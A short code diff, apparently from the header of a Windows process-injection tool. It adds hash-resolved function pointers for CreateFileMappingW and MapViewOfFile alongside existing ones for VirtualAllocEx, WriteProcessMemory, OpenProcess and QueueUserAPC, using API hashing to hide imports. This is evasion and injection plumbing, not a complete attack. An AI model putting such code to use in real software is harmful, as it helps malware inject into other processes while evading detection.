@@ -18,6 +18,8 @@ CTIME_HASHA(ResumeThread);
 CTIME_HASHA(WriteProcessMemory);
 CTIME_HASHA(OpenProcess);
 CTIME_HASHA(QueueUserAPC);
+CTIME_HASHA(CreateFileMappingW);
+CTIME_HASHA(MapViewOfFile);
 
 //VirtualAllocEx
 typedef LPVOID (WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
@@ -70,3 +72,11 @@ extern fnOpenProcess pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHand
 //QueueUserAPC
 typedef DWORD  (WINAPI* fnQueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
 extern fnQueueUserAPC pQueueUserAPC = (fnQueueUserAPC)GetProcAddressH(GetModuleHandleA("KERNEL32.DLL"), QueueUserAPC_Rotr32A);
+
+//CreateFileMappingW
+typedef HANDLE  (WINAPI* fnCreateFileMappingW)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
+extern fnCreateFileMappingW pCreateFileMappingW = (fnCreateFileMappingW)GetProcAddressH(GetModuleHandleA("KERNEL32.DLL"), CreateFileMappingW_Rotr32A);
+
+//MapViewOfFile
+typedef LPVOID  (WINAPI* fnMapViewOfFile)( HANDLE hFileMappingObject, DWORD  dwDesiredAccess, DWORD  dwFileOffsetHigh, DWORD  dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
+extern fnMapViewOfFile pMapViewOfFile = (fnMapViewOfFile)GetProcAddressH(GetModuleHandleA("KERNEL32.DLL"), MapViewOfFile_Rotr32A);
